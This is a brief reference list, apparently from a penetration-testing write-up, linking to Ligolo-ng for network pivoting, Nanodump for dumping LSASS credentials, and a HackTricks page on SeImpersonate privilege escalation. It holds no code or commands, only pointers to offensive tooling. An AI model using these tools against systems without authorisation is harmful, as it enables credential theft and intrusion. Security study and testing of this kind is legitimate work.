- [Ligolo-ng Documentation](https://github.com/nicocha30/ligolo-ng)
- [Nanodump - LSASS Dumping](https://github.com/helpsystems/nanodump)
- [HackTricks - SeImpersonate Privilege](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens)

